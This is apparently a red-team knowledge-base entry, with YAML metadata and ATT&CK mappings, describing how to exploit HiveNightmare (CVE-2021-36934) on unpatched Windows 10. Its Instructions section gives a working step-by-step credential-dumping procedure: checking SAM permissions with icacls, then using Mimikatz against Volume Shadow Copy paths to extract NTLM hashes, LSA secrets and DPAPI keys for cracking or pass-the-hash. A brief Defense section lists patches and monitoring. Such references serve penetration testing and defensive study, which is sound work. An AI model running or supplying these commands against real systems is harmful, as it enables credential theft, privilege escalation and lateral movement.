---
id: 1a59eee5-6c97-4aa5-beae-f12a76079a36
name: HiveNightmare-SAM-Dump-via-Shadow-Copies
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.860643+00:00'
updated_at: '2023-04-10T20:37:52.884337+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access Token Manipulation|T1134 - Access Token Manipulation]]'
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - >-
    [[techniques/Registry Run Keys / Startup Folder|T1060 - Registry Run Keys /
    Startup Folder]]
sub_techniques: []
tags:
  - '[[tags/EoP - Looting for passwords]]'
  - '[[tags/HiveNightmare]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/icacls-view-file-permissions]]'
  - '[[commands/mimikatz-token-whoami-full]]'
  - '[[commands/mimikatz-misc-shadowcopies]]'
  - '[[commands/mimikatz-lsadump-sam-from-shadowcopy]]'
  - '[[commands/mimikatz-lsadump-secrets-from-shadowcopy]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# HiveNightmare-SAM-Dump-via-Shadow-Copies

## Summary

This procedure exploits the HiveNightmare vulnerability (CVE-2021-36934) to dump password hashes from the SAM database and secrets from the SECURITY hive using Volume Shadow Copies. It allows low-privileged users to access restricted registry hives on unpatched Windows systems, enabling credential extraction for further privilege escalation or lateral movement.

## Description

HiveNightmare leverages misconfigured permissions on Volume Shadow Copies (VSS) in Windows 10 versions 1809 to 20H2, allowing non-admin users to read the SAM, SYSTEM, and SECURITY files from shadow copies. The technique involves checking permissions on the registry hives, identifying accessible shadow copies, and using tools like Mimikatz to extract hashes and secrets without needing administrative privileges on the live system. This is particularly useful in privilege escalation scenarios where initial foothold is gained but admin rights are lacking. The extracted NTLM hashes can be cracked offline to obtain plaintext passwords, facilitating persistence or access to domain resources.

## Requirements

1. Local user access on a vulnerable Windows 10 system (versions 1809-20H2, unpatched for CVE-2021-36934).
2. Mimikatz tool installed or available on the target (or transferable via initial access).
3. Command Prompt or PowerShell access.
4. Volume Shadow Copies must be enabled on the system (default for System Protection).

## Defense

- Apply Microsoft patch KB5005565 or later to fix permissions on shadow copy hives.
- Disable or restrict Volume Shadow Copy Service (VSS) access for non-admins via Group Policy.
- Monitor for anomalous access to %SystemRoot%\System32\config\SAM, SYSTEM, SECURITY files or shadow copy paths using Sysmon or EDR tools.
- Enable LSASS protection and restrict credential dumping tools like Mimikatz via AppLocker or WDAC.

## Objectives

1. Verify vulnerable permissions on registry hive shadow copies.
2. Identify and access available shadow copies.
3. Extract SAM hashes for local accounts and LSA secrets from SECURITY hive.
4. Use extracted credentials for privilege escalation or offline cracking.

## Instructions

### Step 1: Verify Permissions on Registry Hives

**Context**: Check if low-privileged users have read access to the SAM hive in shadow copies, indicating the HiveNightmare vulnerability. This step confirms exploitability without alerting defenses.

**Command** ([[commands/icacls-view-file-permissions]]):
```cmd
icacls C:\Windows\System32\config\SAM
```

> Run this in an elevated Command Prompt if possible, but it works for standard users. Look for entries like BUILTIN\Users:(I)(RX), which grants read access to all users—a sign of vulnerability. If present, proceed; otherwise, the system may be patched.

### Step 2: Confirm Current Token Privileges

**Context**: Use Mimikatz to verify your current access level and token details, ensuring you have the necessary privileges to interact with shadow copies.

**Command** ([[commands/mimikatz-token-whoami-full]]):
```cmd
mimikatz> token::whoami /full
```

> This displays your user SID, privileges, and groups. Success is indicated by non-admin token details, confirming the exploit works from low privilege. Expect output showing limited rights but ability to proceed.

### Step 3: List Available Shadow Copies

**Context**: Enumerate Volume Shadow Copies to identify accessible backups of the registry hives. This reveals paths like HarddiskVolumeShadowCopy1 for dumping.

**Command** ([[commands/mimikatz-misc-shadowcopies]]):
```cmd
mimikatz> misc::shadowcopies
```

> Mimikatz will list shadow copy volumes (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1). Note the volume number (usually 1 for the most recent). If no copies are listed, enable System Protection or wait for automatic backups.

### Step 4: Dump SAM Database from Shadow Copy

**Context**: Extract the SAM hive from the shadow copy path to obtain local account hashes. Provide the SYSTEM and SAM paths from the identified shadow copy.

**Command** ([[commands/mimikatz-lsadump-sam-from-shadowcopy]]):
```cmd
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

> Replace HarddiskVolumeShadowCopy1 with the actual volume from Step 3. This dumps NTLM hashes for local users. Save output to a file for offline cracking with tools like Hashcat.

### Step 5: Dump LSA Secrets from SECURITY Hive

**Context**: Extract additional credentials and secrets (e.g., Kerberos keys, cached logons) from the SECURITY hive in the shadow copy, enhancing the credential harvest.

**Command** ([[commands/mimikatz-lsadump-secrets-from-shadowcopy]]):
```cmd
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

> Use the same shadow copy path. Output includes DPAPI keys, service account passwords, and more. This provides material for further attacks like pass-the-hash.
